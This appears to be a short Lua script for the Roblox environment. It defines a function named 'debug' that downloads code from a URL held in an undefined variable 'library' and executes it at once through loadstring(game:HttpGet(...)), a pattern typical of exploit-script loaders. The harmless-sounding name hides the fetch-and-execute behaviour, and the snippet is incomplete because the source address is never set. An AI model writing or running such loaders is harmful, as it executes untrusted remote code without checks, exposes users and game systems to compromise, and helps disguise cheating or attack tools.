local Url = library
function debug()
    return loadstring(game:HttpGet(Url))()
end
debug()
